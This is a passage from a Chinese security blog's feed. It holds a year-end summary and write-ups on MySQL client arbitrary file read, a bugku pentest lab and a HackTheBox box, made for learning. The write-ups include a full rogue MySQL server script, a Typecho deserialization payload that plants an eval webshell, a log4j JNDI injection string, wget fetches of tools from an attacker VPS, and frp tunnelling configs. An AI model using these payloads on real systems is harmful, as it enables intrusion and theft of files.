2. 蝴蝶刀基本入门，达到了可以到同学面前耍的水平
3. 给学校社团拿了一些奖，让年底的奖项申报看起来还可以
4. 完成了暑期实习，确实学到了不少东西
5. 入门了一直想入门的Java安全和内网安全
6. 手里的渗透项目和培训项目完成的都还不错
7. 回了一趟十年没回去的广东老家
8. 线下比赛面基到了很多师傅，像强网杯之类的比赛还算拿到了不错的成绩
这里我专门把蝴蝶刀和纸牌魔术给单独拿了出来，本来文章到这块是想加个视频展示展示的，但很可惜昨天玩蝴蝶刀的时候把手给割到了，所以这里只能请大家自行到b站上搜几个视频当做是我做的了。最后挑两张我觉得最有代表性的照片就当对今年做个总结了，第一张献给我亲爱的星盟，第二张献给我亲爱的QUST-SEC，以CTF开始的一年，就让他以CTF结束吧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/2023Summary%2Fwps9.png&quot; alt=&quot;&quot; /&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/2023Summary%2Fwps10.png&quot; alt=&quot;&quot; /&gt; 
虽然依旧迷茫，依旧无所去从，但相信路上总能够找到答案，愿将一切灰暗归于过往，明朝便踏上不归路。&lt;/p&gt;
</content:encoded></item><item><title>Mysql任意文件读取</title><link>https://f4miti0n.github.io/posts/mysql%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/mysql%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</guid><pubDate>Sun, 05 Nov 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;LOAD DATA INFILE&lt;/h3&gt;
&lt;p&gt;mysql的LOAD DATA INFILE语句主要用于读取一个文件的内容并且存入一个表中。
通常有两种用法，分别是&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;LOAD DATA INFILE &quot;/etc/passwd&quot; into table test fields terminated by &quot;\n&quot;
LOAD DATA LOCAL INFILE &quot;/etc/passwd&quot; into table test fields terminated by &quot;\n
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;情况一读取的是服务端的/etc/passwd，情况二则读取的是客户端的/etc/passwd。在读取完文件之后会把他存到Test表中，其间内容以&lt;code&gt;\n&lt;/code&gt;为分割符分开，我们重点关注一下&lt;code&gt;LOAD DATA LOCAL INFILE&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其工作过程大致如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户在客户端输入：load data local file “/data.txt” into table test；&lt;/li&gt;
&lt;li&gt;客户端-&amp;gt;服务端：我想把我本地的/data.txt文件插入到test表中；&lt;/li&gt;
&lt;li&gt;服务端-&amp;gt;客户端：把你本地的/data.txt文件发给我；&lt;/li&gt;
&lt;li&gt;客户端-&amp;gt;服务端：/data.txt文件的内容；&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;LOAD DATA LOCAL INFILE 的操作结果如下
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/FakeMysql/Pasted%20image%2020240221230320.png&quot; alt=&quot;&quot; /&gt;
LOAD DATA INFILE 的 操作结果如下
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/FakeMysql/Pasted%20image%2020240221230537.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;抓包分析&lt;/h3&gt;
&lt;h4&gt;登录部分&lt;/h4&gt;
&lt;p&gt;kali连windows上的mysql，同时开启wireshark进行抓包，第一个是服务器发给客户端的greeting包，用来告知客户端服务器的基本信息。
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/FakeMysql/Pasted%20image%2020240221232810.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;接下来是客户端发给服务端的登录请求包，里面包含了用户名密码之类的信息
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/FakeMysql/Pasted%20image%2020240221232717.png&quot; alt=&quot;&quot; /&gt;
服务端返回一个ok包，表明当前登录验证成功
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/FakeMysql/Pasted%20image%2020240221233020.png&quot; alt=&quot;&quot; /&gt;
然后是客户端初始化的一些查询，比如select database(); select @@version_comment;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/FakeMysql/Pasted%20image%2020240221233204.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4&gt;LOAD DATA LOCAL INFILE 部分&lt;/h4&gt;
&lt;p&gt;接着来看LOAD DATA LOCAL INFILE 部分，客户端向服务端发起请求，其中包含执行语句
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/FakeMysql/Pasted%20image%2020240221234056.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;紧接着服务器返回了一个包含刚才所要LOAD DATA INFILE的文件名/etc/passwd的特殊格式数据包。
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/FakeMysql/Pasted%20image%2020240221234243.png&quot; alt=&quot;&quot; /&gt;
客户端收到文件名之后，向服务端发送了/etc/passwd里的内容
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/FakeMysql/Pasted%20image%2020240221234327.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Exp&lt;/h3&gt;
&lt;p&gt;关键的节点显然在最后一步的Response TABULAR上。作为攻击者，我们无需在接收到LOAD DATA INFILE请求的时候才回复Response TABULAR，而是在任何一个Request Query后面都可以回复我们定制好的Response TABULAR，以此来实现任意文件读取&lt;/p&gt;
&lt;p&gt;ps：还记得那个初始化查询不？利用起来&lt;/p&gt;
&lt;p&gt;总结一下，伪造的Mysql服务端可以分为以下三个步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;向客户端发送Greeting数据包&lt;/li&gt;
&lt;li&gt;客户端发送登录请求时，回复Response OK的数据包&lt;/li&gt;
&lt;li&gt;客户端发送查询请求时，回复Response TABULAR数据包进行读文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这里直接拿现成的了，感谢师傅们的智慧&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
#coding: utf8


import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers



PORT = 3306

log = logging.getLogger(__name__)

log.setLevel(logging.INFO)
tmp_format = logging.handlers.WatchedFileHandler(&apos;mysql.log&apos;, &apos;ab&apos;)
tmp_format.setFormatter(logging.Formatter(&quot;%(asctime)s:%(levelname)s:%(message)s&quot;))
log.addHandler(
    tmp_format
)

filelist = (
    #&apos;/etc/passwd&apos;,
    &apos;F:/test.txt&apos;,
)


#================================================
#=======No need to change after this lines=======
#================================================

__author__ = &apos;Gifts&apos;

def daemonize():
    import os, warnings
    if os.name != &apos;posix&apos;:
        warnings.warn(&apos;Cant create daemon on non-posix system&apos;)
        return

    if os.fork(): os._exit(0)
    os.setsid()
    if os.fork(): os._exit(0)
    os.umask(0o022)
    null=os.open(&apos;/dev/null&apos;, os.O_RDWR)
    for i in xrange(3):
        try:
            os.dup2(null, i)
        except OSError as e:
            if e.errno != 9: raise
    os.close(null)


class LastPacket(Exception):
    pass


class OutOfOrder(Exception):
    pass


class mysql_packet(object):
    packet_header = struct.Struct(&apos;&amp;lt;Hbb&apos;)
    packet_header_long = struct.Struct(&apos;&amp;lt;Hbbb&apos;)
    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len &amp;lt; 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
        else:
            header = mysql_packet.packet_header.pack(payload_len &amp;amp; 0xFFFF, payload_len &amp;gt;&amp;gt; 16, 0, self.packet_num)

        result = &quot;{0}{1}&quot;.format(
            header,
            self.payload
        )
        return result

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = ord(raw_data[0])
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)


class http_request_handler(asynchat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.set_terminator(3)
        self.state = &apos;LEN&apos;
        self.sub_state = &apos;Auth&apos;
        self.logined = False
        self.push(
            mysql_packet(
                0,
                &quot;&quot;.join((
                    &apos;\x0a&apos;,  # Protocol
                    &apos;5.6.28-0ubuntu0.14.04.1&apos; + &apos;\0&apos;,
                    &apos;\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&apos;,
                ))            )
        )

        self.order = 1
        self.states = [&apos;LOGIN&apos;, &apos;CAPS&apos;, &apos;ANY&apos;]

    def push(self, data):
        log.debug(&apos;Pushed: %r&apos;, data)
        data = str(data)
        asynchat.async_chat.push(self, data)

    def collect_incoming_data(self, data):
        log.debug(&apos;Data recved: %r&apos;, data)
        self.ibuffer.append(data)

    def found_terminator(self):
        data = &quot;&quot;.join(self.ibuffer)
        self.ibuffer = []

        if self.state == &apos;LEN&apos;:
            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
            if len_bytes &amp;lt; 65536:
                self.set_terminator(len_bytes)
                self.state = &apos;Data&apos;
            else:
                self.state = &apos;MoreLength&apos;
        elif self.state == &apos;MoreLength&apos;:
            if data[0] != &apos;\0&apos;:
                self.push(None)
                self.close_when_done()
            else:
                self.state = &apos;Data&apos;
        elif self.state == &apos;Data&apos;:
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    # Fix ?
                    self.order = packet.packet_num + 2
                if packet.packet_num == 0:
                    if packet.payload[0] == &apos;\x03&apos;:
                        log.info(&apos;Query&apos;)

                        filename = random.choice(filelist)
                        PACKET = mysql_packet(
                            packet,
                            &apos;\xFB{0}&apos;.format(filename)
                        )
                        self.set_terminator(3)
                        self.state = &apos;LEN&apos;
                        self.sub_state = &apos;File&apos;
                        self.push(PACKET)
                    elif packet.payload[0] == &apos;\x1b&apos;:
                        log.info(&apos;SelectDB&apos;)
                        self.push(mysql_packet(
                            packet,
                            &apos;\xfe\x00\x00\x02\x00&apos;
                        ))
                        raise LastPacket()
                    elif packet.payload[0] in &apos;\x02&apos;:
                        self.push(mysql_packet(
                            packet, &apos;\0\0\0\x02\0\0\0&apos;
                        ))
                        raise LastPacket()
                    elif packet.payload == &apos;\x00\x01&apos;:
                        self.push(None)
                        self.close_when_done()
                    else:
                        raise ValueError()
                else:
                    if self.sub_state == &apos;File&apos;:
                        log.info(&apos;-- result&apos;)
                        log.info(&apos;Result: %r&apos;, data)

                        if len(data) == 1:
                            self.push(
                                mysql_packet(packet, &apos;\0\0\0\x02\0\0\0&apos;)
                            )
                            raise LastPacket()
                        else:
                            self.set_terminator(3)
                            self.state = &apos;LEN&apos;
                            self.order = packet.packet_num + 1

                    elif self.sub_state == &apos;Auth&apos;:
                        self.push(mysql_packet(
                            packet, &apos;\0\0\0\x02\0\0\0&apos;
                        ))
                        raise LastPacket()
                    else:
                        log.info(&apos;-- else&apos;)
                        raise ValueError(&apos;Unknown packet&apos;)
            except LastPacket:
                log.info(&apos;Last packet&apos;)
                self.state = &apos;LEN&apos;
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            except OutOfOrder:
                log.warning(&apos;Out of order&apos;)
                self.push(None)
                self.close_when_done()
        else:
            log.error(&apos;Unknown state&apos;)
            self.push(&apos;None&apos;)
            self.close_when_done()


class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind((&apos;&apos;, PORT))
            except socket.error:
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info(&apos;Conn from: %r&apos;, pair[1])
            tmp = http_request_handler(pair)


z = mysql_listener()
# daemonize()
asyncore.loop()


&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>bugku渗透测试2</title><link>https://f4miti0n.github.io/posts/bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%952/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%952/</guid><pubDate>Fri, 20 Oct 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;开启靶场，访问主页，看到了这么个博客，用Wappalyzer简单的做了一下指纹识别，再配合F12查看源码，最终找到了博客的框架版本。
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024210929.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024210957.png&quot; alt=&quot;&quot; /&gt;
上网搜索一下&lt;code&gt;Typecho 1.0/14.10.10&lt;/code&gt;的nday利用，最终找到这么一篇文章：https://blog.csdn.net/weixin_43886198/article/details/111474906，完美符合条件，搭配上文章中提到的poc，我们向install.php发送特定请求，数据包内容如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024211216.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /install.php?finish HTTP/1.1
Host: 106.14.212.180
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 929
Origin: http://106.14.212.180
Connection: close
Referer: http://106.14.212.180/install.php?finish
Cookie: PHPSESSID=5nt895b5pkbe53mtd5nvkf30f6
Upgrade-Insecure-Requests: 1

__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjYzOiJmcHV0cyhmb3Blbignc2hlbGwucGhwJywndycpLCc8Pz1AZXZhbCgkX1JFUVVFU1RbYnV6aGlkYW9dKT8%2BJykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX1zOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo2MzoiZnB1dHMoZm9wZW4oJ3NoZWxsLnBocCcsJ3cnKSwnPD89QGV2YWwoJF9SRVFVRVNUW2J1emhpZGFvXSk%2FPicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ%3D%3D
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入&lt;code&gt;buzhidao&lt;/code&gt;链接蚁剑，根目录下读取文件拿到第一个flag
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024211616.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;之后再去网站根目录下转转，读取&lt;code&gt;config.inc.php&lt;/code&gt;，得到数据库用户名以及密码，用蚁剑的数据管理模块搭配用户名密码链接，读取第二个&lt;code&gt;flag&lt;/code&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024211811.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024212019.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024212132.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;进入横向移动阶段，用拿的&lt;code&gt;webshell&lt;/code&gt;传一个&lt;code&gt;fscan&lt;/code&gt;到&lt;code&gt;tmp&lt;/code&gt;目录下，加权限查本机ip一通乱梭后，fscan直接开扫，扫描结果如下。
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024212602.png&quot; alt=&quot;&quot; /&gt;
我们重点关注一下&lt;code&gt;192.168.0.3&lt;/code&gt;这个&lt;code&gt;IP&lt;/code&gt;，老办法传个&lt;code&gt;frp&lt;/code&gt;上去，其中frpc的内容如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Frpc.ini&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;[common]
# 服务端地址及端口
server_addr = XXX.XXX.XXX.XXX
server_port = 10013
log_file = /dev/stdout
log_level = info
log_max_days = 3

# 发布本地 web 服务
[web]
type = tcp
# 映射ip
local_ip = 192.168.0.3
# 映射端口
local_port = 80
# 云服务器的80端口
remote_port = 10014
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上传上去之后vps启动监听，靶机也启动frpc
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024213837.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024213923.png&quot; alt=&quot;&quot; /&gt;
成功把流量转发到了vps的10014端口上，访问界面如下
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024214154.png&quot; alt=&quot;&quot; /&gt;
接下来的步骤就是通过目录扫描，发现源码泄露，然后再经过一番代码审计发现存在log4j漏洞，但这么一步一步截图操作下来有些太麻烦了，这里直接开打。&lt;/p&gt;
&lt;p&gt;在vps上开启反弹shell监听，准备好jndi注入的链接。
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024214832.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024214851.png&quot; alt=&quot;&quot; /&gt;
在用户名处输入:  &lt;code&gt;${jndi:rmi://xxxxxxx:1099/hiksok}&lt;/code&gt;,完成jndi注入,vps提示上线,直接查看环境变量, 瞬秒3个flag.
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024215247.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;然后跳到&lt;code&gt;tmp&lt;/code&gt;目录下,用&lt;code&gt;wget&lt;/code&gt;命令下载下来我们要用的&lt;code&gt;fscan_amd64&lt;/code&gt;和&lt;code&gt;frpc&lt;/code&gt; (已经挂在vps上了)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;vps: 
	1. python3 -m http.server 60005
client: 
	1. wget http://xxxxxx:60005/fscan_amd64
	2. wget http://xxxxxx:60005/frpc
	3. wget http://xxxxxx:60005/frpc.ini
	4. wget http://xxxxxx:60005/frpc_full.ini
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;fscan扫描结果如下，这里去把&lt;code&gt;192.168.1.3&lt;/code&gt;给代理出来，启动&lt;code&gt;frp&lt;/code&gt;，访问代理结果，得到如下界面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024224248.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024235152.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里是用到了我们git上马的一个技巧，去git一个有马的库到本地就行，因为这里可以对phtml进行解析，所以我们的马也要是phtml类型的，这里是自己建了这么一个库，我们直接submit一下地址就可以上马了：&lt;code&gt;https://github.com/F4miti0n/bugku2.git&lt;/code&gt;，最终也是蚁剑成功链接，在根目录读取到了第七个&lt;code&gt;flag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024235750.png&quot; alt=&quot;&quot; /&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231024235926.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;接着到&lt;code&gt;tmp&lt;/code&gt;上传&lt;code&gt;frp&lt;/code&gt;和&lt;code&gt;fscan_amd64&lt;/code&gt;，查完ip之后发现它还有一个网卡，我们把目标定为&lt;code&gt;10.xx.xx.xx&lt;/code&gt;这个网段，fscan开扫结果如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231025000955.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;基本没什么东西能打了，&lt;code&gt;10.10.0.1&lt;/code&gt;和&lt;code&gt;10.10.0.2&lt;/code&gt;都被打完了，只有&lt;code&gt;10.10.0.3&lt;/code&gt;这么个漏网之鱼还留着。因为它只开了21端口，我们肯定会先想到去打它的&lt;code&gt;ftp&lt;/code&gt;服务，比如用匿名访问什么的去试一下。但不管怎么样，显然我们需要先把他给代理出来，再调用一下&lt;code&gt;frp&lt;/code&gt;（frpclient内容如下）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[common]
# 服务端地址及端口
server_addr = xxx.xxx.xxx.xxx
server_port = 10013
log_file = /dev/stdout
log_level = info
log_max_days = 3

# 构建socks5代理
[socks]
type = tcp
plugin = socks5
# 云服务器的端口
remote_port = 60014
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;本来是想单独代理一个端口出来的，但发现ftp怎么都链接不上，看提示说好像是还要代理几个别的端口，很烦人，直接上个&lt;code&gt;socks5&lt;/code&gt;代理当&lt;code&gt;vpn&lt;/code&gt;用算了，靶机那边链接一下frp，kali那边在conf文件下配置&lt;code&gt;/etc/proxychains4.conf&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;socks5 xxx.xxx.xxx.xxx 60014
//文件尾加这么一行
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;一开始匿名访问没有成功，后来发现原来给提示了，账户名密码都是&lt;code&gt;guest&lt;/code&gt;，我们直接就能链接上ftp，最终在根目录和当前目录收集到了最后两个flag。
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231025003216.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/bugku2%E9%9D%B6%E5%9C%BA/Pasted%20image%2020231025003510.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>HackTheBox APT</title><link>https://f4miti0n.github.io/posts/apt/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/apt/</guid><pubDate>Sat, 14 Oct 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;靶机：10.10.10.213，只开了80和135这两个端口。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231011234048.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;访问一下&lt;code&gt;http&lt;/code&gt;服务，没发现什么比较有趣的东西，是个静态站，扫目录也没扫出来什么东西，基本不考虑从web端撕口子了，去看一下&lt;code&gt;RPC&lt;/code&gt;服务&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231011234211.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231011234526.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;试着用&lt;code&gt;rpcclient&lt;/code&gt;匿名访问裸连，失败无果&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rpcclient -U &quot;&quot; -N 10.10.10.213
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231011234643.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;再试着用下&lt;code&gt;rpcmap&lt;/code&gt;尝试获取远程&lt;code&gt;RPC&lt;/code&gt;的端点信息，重点关注我单列出来的&lt;code&gt;MSDCOM&lt;/code&gt;这里，经过&lt;code&gt;brute-opnums&lt;/code&gt;最终发现 &lt;code&gt;99FCFEC4-5260-101B-BBCB-00AA0021347A&lt;/code&gt;存在可调用的操作数（就是存在可调用的方法），我们去官网查一查它的资料 。
（诶，为什么&lt;code&gt;MS-RPCE&lt;/code&gt;不查呢？我感觉这两个对象差不多啊）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;impacket-rpcmap ncacn_ip_tcp:10.10.10.213[135]
//查询服务器10.10.10.213上端口135的RPC服务的。它会显示每个服务的UUID，版本号，绑定字符串和注释绑定字符串是用来描述如何连接到RPC服务的信息，比如协议，地址，端口等。[ncacn_ip_tcp是一种RPC传输协议，表示使用TCP/IP协议，10.10.10.213 是服务器的IP地址，135是服务器上运行RPC服务的端口号。

impacket-rpcmap ncacn_ip_tcp:10.10.10.213[135] -brute-uuid
//用来暴力破解服务器10.10.10.213上端口135的RPC服务的UUID的。它会尝试使用一个预定义的UUID列表来连接到RPC服务，并显示成功连接的服务的信息。这样可以发现一些隐藏或未公开的RPC服务.

impacket-rpcmap ncacn_ip_tcp:10.10.10.213[135] -brute-uuids -brute-opnums
//可以用于爆破一些可能有漏洞uuid操作及其操作数
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231012000336.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231012131331.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;查询地址: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4
从官网上查出来的结果如下，进程名称 &lt;code&gt;IID_IObjectExporter&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231012132700.png&quot; alt=&quot;&quot; /&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/APT/Pasted%20image%2020231012133224.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;和打CTF的时候一样，当你想利用/绕过一个方法的时候，最好的办法是先去搜一下它的历史EXP。我们先去了解一下这个进程的相关信息。&lt;/p&gt;
